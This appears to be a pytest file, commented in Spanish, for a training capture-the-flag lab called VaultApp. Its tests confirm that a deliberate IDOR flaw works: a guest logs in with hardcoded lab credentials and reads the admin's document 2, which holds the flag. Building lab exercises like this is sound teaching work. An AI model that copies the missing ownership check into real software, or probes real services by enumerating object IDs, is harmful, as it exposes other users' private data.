"""
Tests de VaultApp (IDOR challenge).
Verifica que la vulnerabilidad IDOR está presente y es explotable.
Requiere el servicio Docker corriendo en localhost:8080.
"""
import requests, time, pytest

BASE = "http://localhost:8084"


def _service_up(timeout=3):
    try:
        return requests.get(f"{BASE}/health", timeout=timeout).status_code == 200
    except Exception:
        return False


skip_if_down = pytest.mark.skipif(
    not _service_up(), reason="Servicio admin_roto no disponible (arranca Docker)"
)


def wait_up(timeout=15):
    for _ in range(timeout * 5):
        if _service_up(1):
            return
        time.sleep(0.2)
    pytest.skip("Servicio no disponible tras esperar")


@skip_if_down
def test_login_invitado():
    wait_up()
    r = requests.post(f"{BASE}/api/login",
                      json={"usuario": "invitado", "password": "invitado123"})
    assert r.status_code == 200
    data = r.json()
    assert "tu_id_de_usuario" in data
    assert data["tu_id_de_usuario"] == 1001


@skip_if_down
def test_sin_autenticar_rechaza():
    s = requests.Session()
    r = s.get(f"{BASE}/api/mis-documentos")
    assert r.status_code == 401


@skip_if_down
def test_invitado_ve_sus_propios_docs():
    s = requests.Session()
    s.post(f"{BASE}/api/login",
           json={"usuario": "invitado", "password": "invitado123"})
    r = s.get(f"{BASE}/api/mis-documentos")
    assert r.status_code == 200
    data = r.json()
    assert data["usuario_id"] == 1001
    titulos = [d["titulo"] for d in data["documentos"]]
    assert "FLAG CONFIDENCIAL" not in titulos


@skip_if_down
def test_idor_accede_doc_admin():
    """El alumno debe encontrar este exploit: doc_id=2 pertenece al admin."""
    s = requests.Session()
    s.post(f"{BASE}/api/login",
           json={"usuario": "invitado", "password": "invitado123"})
    r = s.get(f"{BASE}/api/documentos/2")
    assert r.status_code == 200
    doc = r.json()["documento"]
    assert doc["contenido"].startswith("CTF{")
    assert doc["contenido"].endswith("}")
